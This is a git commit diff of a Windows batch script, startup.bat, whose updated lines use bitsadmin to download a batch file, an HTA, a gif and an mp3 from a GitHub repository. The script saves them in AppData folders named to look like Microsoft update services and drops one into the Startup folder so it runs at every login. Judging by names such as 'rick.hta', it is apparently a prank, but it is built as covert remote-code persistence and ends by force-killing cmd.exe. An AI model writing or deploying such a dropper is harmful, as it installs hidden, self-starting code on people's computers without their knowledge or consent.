dec0800a8882233abe12252593b80853b91ddcaa
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 22:30:08 +0800

    Update startup.bat

--- Online/startup.bat
+++ Online/startup.bat
@@ -3,12 +3,10 @@
 cls
 
 mkdir "%AppData%\Microsoft\Update\User\Services"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
-
-del startup.bat
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
 
 taskkill /f /im cmd.exe
